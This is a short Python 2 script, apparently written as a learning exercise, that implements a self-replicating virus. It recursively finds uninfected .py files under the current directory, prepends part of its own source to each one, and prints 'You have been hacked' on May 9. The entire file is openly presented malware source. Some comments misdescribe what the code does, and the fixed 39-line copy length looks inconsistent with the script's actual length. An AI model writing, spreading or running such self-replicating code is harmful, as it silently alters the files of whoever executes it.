#!/usr/bin/python

# imports modules
import os
import datetime

# creates variable 
SIGNATURE = "VIRUS"

# creates first function- locates and combines file names and paths and marks them for "infection"
def locate(path):
    files_targeted = []
    # gets all files and directores in "path"
    filelist = os.listdir(path)
    # for loop
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
          # adds elements (paths and names) to list
            files_targeted.extend(locate(path+"/"+fname))
        # sets infected status to false if a file is python
        elif fname[-3:] == ".py":
            infected = False
            # for loop
            for line in open(path+"/"+fname):
                # calls on previous variable to set file status 
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                # appends (adds) path and name to list
                files_targeted.append(path+"/"+fname)
    # ends the execution of the function and returns result
    return files_targeted

# creates second function- uses the files found previously and deletes them
def infect(files_targeted):
    # creates variable that opens file path
    virus = open(os.path.abspath(__file__))
    # creates empty variable 
    virusstring = ""
    # for loop that enumerates previous file path variable
    for i,line in enumerate(virus):
        if 0 <= i < 39:
          # adds the two variables and assigns final value
            virusstring += line
    virus.close
    # for loop to read files found then create files with read contents and new virusstring variable
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# creates third function- prints line on May ninth
def detonate():
    # specifies date using imported datetime module
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # prints line to screen
        print "You have been hacked"
        
# calls defined functions in order to find specified files and create duplicated "infected" files which have an customizable variable added
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()

